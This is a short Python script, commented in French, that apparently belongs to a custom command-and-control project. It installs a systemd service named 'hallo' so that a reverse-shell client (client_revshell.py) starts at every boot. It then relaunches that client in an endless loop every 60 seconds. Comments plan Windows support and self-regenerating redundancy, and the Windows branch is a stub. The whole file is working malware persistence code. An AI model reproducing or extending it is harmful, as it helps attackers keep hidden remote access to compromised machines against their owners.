# persistance
# Version 0.3
# Auteur : Raphaël KATHALUWA-LIYANAGE

import time
import os
import subprocess

# Cross-plateforme : vérification de l'OS client
if os.name == 'nt':
    # persistance windows nt
    print(8+1)
else:
    service_path = "/etc/systemd/system/hallo.service"

    if not os.path.exists(service_path):
        open(service_path,"w").writelines('''
        [Unit]
        Description=Lancement au démarrage

        [Service]
        ExecStart=/usr/bin/python3 /home/kali/Documents/python/projet_python/customC2/client_revshell.py

        [Install]
        WantedBy=multi-user.target''')
        os.system("systemctl enable --now hallo.service")
    
while True:
    subprocess.call("python3 client_revshell.py", shell=True)
    time.sleep(60)

# ajouter un copier/coller du fichier
# ajouter support windows
# ajouter redondance (doublons + regénération)